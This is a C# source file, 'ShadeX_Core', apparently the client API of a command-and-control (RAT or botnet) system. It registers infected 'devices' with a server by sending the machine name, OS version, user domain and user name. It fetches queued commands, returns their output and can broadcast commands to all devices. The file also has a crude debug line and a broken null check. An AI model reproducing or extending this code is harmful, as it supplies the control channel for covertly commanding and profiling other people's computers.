using System;
using System.Net;
using System.Text;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Threading;

namespace ShadeX_Core
{
    public class ShadeApi
    {
        private string adress;
        private ConnectionHandler connectionHandler;
        
        public ShadeApi(ConnectionHandler connectionHandler)
        {
            this.connectionHandler = connectionHandler;
            this.adress = connectionHandler.adress;
        }

        /* DOWNLOAD CONFIG FILE */
        public string[] GetConfigFile(string device_id)
        {
            string res = connectionHandler.Request(adress + "/device/", new NameValueCollection() {
                { "action","get_config_file" },
                { "device_id", device_id }
            });
            return (res != null || res != "") ? res.Split(',') : null;
        }

        /* SEND RESPONSE COMMAND */
        public bool ResponseCommand(string command_id,string response_command)
        {
            string res = connectionHandler.Request(adress + "/command/", new NameValueCollection() {
                { "action","response_command" },
                { "command_id",command_id },
                { "command_response", response_command }
            });
            return (res != null) && (res == "True");
        }

        /* GET NEXT COMMAND TO EXECUTE */
        public DeviceCommand GetCommandToExecute(string device_id)
        {
            DeviceCommand deviceCommand = DeviceCommand.Empty;
            foreach (DeviceCommand cmd in GetDeviceCommands(device_id))
            {
                if (cmd.command_response == string.Empty)
                {
                    deviceCommand = cmd;
                }
            }
            return deviceCommand;
        }

        /* GET DEVICE COOMMANDS */
        public DeviceCommand[] GetDeviceCommands(string device_id)
        {
            List<DeviceCommand> deviceCommands = new List<DeviceCommand>();

            string res = connectionHandler.Request(adress + "/command/", new NameValueCollection() {
                { "action", "get_device_all_commands" },
                { "device_id", device_id }
            });

            if(res != null)
            {
                string[] command = res.Split(',');
                for (int i = 0; i < command.Length - 1; i++)
                {
                    string[] partedCommand = command[i].Split(':');
                    if (partedCommand.Length > 2 && partedCommand[0] != string.Empty)
                    {
                        deviceCommands.Add(new DeviceCommand(partedCommand[0],partedCommand[1], partedCommand[2]));
                    }
                    else
                    {
                        deviceCommands.Add(new DeviceCommand(partedCommand[0],partedCommand[1], string.Empty));
                    }
                }
            }

            return deviceCommands.ToArray();
        }

        /* SEND REQUEST COMMAND TO SINGLE DEVICE */
        public bool RequestCommand(string device_id, string command)
        {
            string res = connectionHandler.Request(adress + "/command/", new NameValueCollection() {
                { "action", "request_command_to_device" },
                { "command_request", command},
                { "device_id", device_id }
            });

            Console.WriteLine(device_id + " : " + command);

            Console.WriteLine("ZADANIE KURWA " + res);
            return (res != null) && (res == "True");
        }

        /*SEND REQUEST COMMAND TO ALL DEVICES */
        public bool RequestCommand(string command)
        {
            string res = connectionHandler.Request(adress + "/command/", new NameValueCollection() {
                { "action", "request_command_to_all_devices" },
                { "command_request", command}
            });
            return (res != null) && (res == "True"); ;
        }

        /* UPDATE LAST SEEN INFO */
        public bool UpdateOnlineStatusTime(string device_id)
        {
            string res = connectionHandler.Request(adress + "/device/", new NameValueCollection() {
                { "action","set_last_seen" },
                { "device_id", device_id },
                { "last_seen", DateTime.Now.ToString() }
            });

            return (res != null) && (res == "True");
        }

        /* CREATING NEW DEVICE */
        public bool CreateNewDevice(string device_id)
        {
            string res = connectionHandler.Request(adress + "/device/",new NameValueCollection() {
                { "action","create_new_device"},
                { "device_id", device_id},
                { "machine_name", Environment.MachineName },
                { "os_version", Environment.OSVersion.ToString() },
                { "user_domain_name", Environment.UserDomainName },
                { "user_name", Environment.UserName }
            });

            return (res != null) && (res == "True");
        }
    }
}
